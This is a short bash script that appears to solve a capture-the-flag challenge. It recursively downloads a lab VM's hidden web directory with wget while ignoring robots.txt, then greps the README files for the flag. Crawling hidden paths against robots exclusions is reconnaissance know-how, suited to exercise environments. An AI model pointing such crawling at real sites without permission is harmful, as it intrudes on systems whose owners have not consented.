#!/bin/bash

echo "input the VM ip address :"
read ip

url="http://${ip}/.hidden/"
dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

result=$(wget -q --recursive -e robots=off --convert-links $url)
result=$(find . -type f -name 'README' -exec cat {} \; | grep -Ev 'T|N|D')
echo "FLAG: ${result}"
rm -rf $dir/$ip